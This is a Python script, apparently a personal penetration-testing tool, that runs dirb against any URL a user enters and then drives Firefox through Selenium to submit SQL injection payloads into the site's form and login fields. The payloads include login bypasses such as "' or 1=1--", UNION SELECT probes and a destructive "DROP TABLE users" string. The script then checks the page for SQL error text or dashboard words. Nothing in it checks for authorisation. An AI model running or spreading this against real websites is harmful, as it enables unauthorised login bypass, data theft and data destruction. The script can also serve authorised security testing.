import subprocess
import time
import random
import string
import re
from urllib.parse import urlparse
from selenium import webdriver
from selenium.common.exceptions import StaleElementReferenceException, ElementNotInteractableException, TimeoutException
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# List of SQLi payloads
sqli_payloads = [
    "' or 1=1--",
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "admin' --",
    "' UNION SELECT NULL, NULL, NULL --",
    "' OR '1'='1' --",
    "' OR 'a'='a"
    # Add more payloads if necessary
]

def random_password(length=12):
    """Generates a random password."""
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for i in range(length))

def is_valid_url_or_ip(input):
    """
    Check if the input is a valid URL or IP address.
    """
    try:
        result = urlparse(input)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False

def run_dirb(url):
    """
    Run dirb to find subdirectories of the given URL or IP address.
    """
    subdirs = []
    try:
        process = subprocess.Popen(['dirb', url, '/home/akrakali/Documents/PI/dir.txt', '-r', '-S'],
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        print("Running dirb, please wait...")

        while True:
            line = process.stdout.readline()
            if not line and process.poll() is not None:
                break

            # Check if the line contains a valid subdirectory or file
            match = re.search(r'^\+ (.*?)( \(|$)', line)
            if match:
                path = match.group(1).strip()
                subdirs.append(path)

            print(line, end='')  # Print dirb output line by line

        process.wait()  # Wait for the process to complete
    except FileNotFoundError:
        print("Dirb is not installed or not found in PATH.")
    return subdirs

def test_sqli_payloads(url, input_locator, payload, password=None):
    """
    Function to test SQLi payloads on input fields.
    """
    driver = webdriver.Firefox()
    driver.get(url)

    wait = WebDriverWait(driver, 10)
    input_element = wait.until(EC.presence_of_element_located(input_locator))

    input_field_id = input_element.get_attribute("id")
    input_field_name = input_element.get_attribute("name")
    print(f"Testing payload '{payload}' on input field '{input_field_name}' (ID: {input_field_id})")

    try:
        # Clear the input field
        input_element.clear()

        # Enter the payload into the input field
        input_element.send_keys(payload)

        # If a password is provided, enter it into the password field
        if password:
            password_element = driver.find_element(By.XPATH, "//input[@type='password']")
            password_element.clear()
            password_element.send_keys(password)

        # Submit the form
        input_element.submit()
        time.sleep(2)  # Wait for the page to reload and search for errors

        # Check for signs of SQLi vulnerability
        page_source = driver.page_source.lower()
        sql_errors = [
            "sql syntax",
            "mysql",
            "syntax error",
            "warning",
            "unclosed quotation mark",
            "quoted string not properly terminated"
        ]
        if any(error in page_source for error in sql_errors):
            print(f"Possible SQLi vulnerability detected with payload '{payload}'")
            print(f"Vulnerable input field: {input_field_name} (ID: {input_field_id})")
            driver.quit()
            return True

        # Additional check: look for changes in application behavior or unexpected data
        if "welcome" in page_source or "admin" in page_source or "dashboard" in page_source:
            print(f"Unexpected behavior detected with payload '{payload}' - Potential SQLi")
            driver.quit()
            return True

    except StaleElementReferenceException:
        print("StaleElementReferenceException occurred. Re-finding the element.")

    finally:
        driver.quit()
    return False

def should_test_input(input_element):
    """
    Analyze if the input field is worth testing for SQLi.
    """
    input_type = input_element.get_attribute("type")
    input_name = input_element.get_attribute("name")
    input_id = input_element.get_attribute("id")

    if input_type in ["text", "password", "textarea"]:
        print(f"Input field '{input_name}' (ID: {input_id}) is worth testing for SQLi.")
        return True
    else:
        print(f"Input field '{input_name}' (ID: {input_id}) is not worth testing for SQLi (type: {input_type}).")
        return False

def main():
    # Get the URL or IP address of the website from the user
    input_url = input("Enter the URL or IP address of the website to test: ")

    # Validate the input as URL or IP address
    if not is_valid_url_or_ip(input_url):
        print("Invalid URL or IP address format.")
        return

    # Ensure the URL has a scheme
    if not input_url.startswith('http://') and not input_url.startswith('https://'):
        input_url = 'http://' + input_url

    # Run dirb to find subdirectories
    print("\nRunning dirb to find subdirectories...")
    subdirs = run_dirb(input_url)
    print("\nSubdirectories found:")
    for subdir in subdirs:
        print(f"  - {subdir}")

    print(f"\nTotal {len(subdirs)} subdirectories found.\n")

    # Launch the browser to get the input elements
    driver = webdriver.Firefox()
    driver.get(input_url)

    # Wait for the input fields to be present
    wait = WebDriverWait(driver, 10)
    input_elements = wait.until(EC.presence_of_all_elements_located((By.XPATH, "//input[@type='text'] | //input[@type='password'] | //textarea")))

    print(f"Found {len(input_elements)} input fields on the webpage.")

    # Check if the form is a login form
    is_login_form = any(input_element.get_attribute("type") == "password" for input_element in input_elements)

    # Initialize lists to store working and potential payloads
    working_payloads = []
    potential_payloads = []

    # Test SQLi payloads on each input field
    if is_login_form:
        print("Detected login form. Testing payloads on username and password fields.")
        username_field = None
        password_field = None

        for input_element in input_elements:
            input_type = input_element.get_attribute("type")
            if input_type == "text":
                username_field = input_element
            elif input_type == "password":
                password_field = input_element

        if username_field and password_field:
            for payload in sqli_payloads:
                input_locator = (By.NAME, username_field.get_attribute("name"))
                if test_sqli_payloads(input_url, input_locator, payload, random_password()):
                    working_payloads.append((username_field.get_attribute("name"), payload))
                    potential_payloads.append(payload)

    else:
        print("Not a login form. Testing payloads on each input field one by one.")
        for input_element in input_elements:
            input_field_id = input_element.get_attribute("id")
            input_field_name = input_element.get_attribute("name")
            input_locator = (By.ID, input_field_id) if input_field_id else (By.NAME, input_field_name)
            print("\n-----------------------------------------------")

            # Analyze if the input field is worth testing
            if should_test_input(input_element):
                for payload in sqli_payloads:
                    if test_sqli_payloads(input_url, input_locator, payload):
                        working_payloads.append((input_field_name, payload))
                        potential_payloads.append(payload)
            else:
                print(f"Skipping SQLi test for input field '{input_field_name}' (ID: {input_field_id})")

    # List all the working and potential payloads for SQLi
    print("\n---------------------------------------------------")
    print("SQLi testing completed.")
    if working_payloads:
        print("\nWorking SQLi Payloads:")
        for input_field, payload in working_payloads:
            print(f"Input Field: {input_field}, Payload: {payload}")
    else:
        print("\nNo working SQLi payloads found.")

    if potential_payloads:
        print("\nPotential SQLi Payloads:")
        for payload in set(potential_payloads):
            print(payload)

    driver.quit()

if __name__ == "__main__":
    main()
